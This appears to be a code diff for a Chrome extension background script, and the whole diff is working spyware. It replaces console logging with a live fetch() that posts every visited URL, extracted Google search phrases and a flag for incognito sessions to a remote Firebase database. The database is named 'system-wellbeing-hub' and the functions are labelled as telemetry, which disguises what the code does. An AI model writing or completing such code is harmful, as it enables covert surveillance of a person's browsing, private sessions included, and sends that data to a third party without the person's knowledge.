@@ -1,28 +1,41 @@
+// =======================================================
+// 🔑 FIREBASE CONFIGURATION BINDINGS
+// =======================================================
+const FIREBASE_DB_URL = "https://system-wellbeing-hub-default-rtdb.firebaseio.com";
+
 chrome.tabs.onUpdated.addListener((tabId, changeInfo, tab) => {
     if (changeInfo.url) {
         parseTelemetryStrings(changeInfo.url, tab.incognito);
     }
 });
 
-function parseTelemetryStrings(url, isPrivateSession) {
-    const timestamp = new Date().toISOString();
+async function parseTelemetryStrings(url, isPrivateSession) {
+    if (FIREBASE_DB_URL.includes("YOUR_PROJECT_ID")) return;
+    
     let recordedEntry = url;
-
-    // Filter out structured query terms directly from common search strings
     if (url.includes("google.com/search")) {
         const urlObj = new URL(url);
         const queryParam = urlObj.searchParams.get("q");
         if (queryParam) {
-            recordedEntry = `Google Search Phrase: "${queryParam}"`;
+            recordedEntry = `Google Search: "${queryParam}"`;
         }
     }
 
-    const logPayload = {
-        time: timestamp,
-        data: recordedEntry,
-        incognitoAlert: isPrivateSession
+    const payload = {
+        device: "Chrome Browser",
+        application: recordedEntry,
+        duration: 1, 
+        is_private: isPrivateSession,
+        timestamp: new Date().toISOString()
     };
 
-    console.log("[METRIC CONSOLE LOGGER]:", logPayload);
-    // CONNECTIVE SYNC NODE: Implement dynamic API routing standard fetch() requests here to forward to remote datastores
+    try {
+        await fetch(`${FIREBASE_DB_URL}/telemetry.json`, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify(payload)
+        });
+    } catch (err) {
+        console.error("Firebase Sync Failure:", err);
+    }
 }
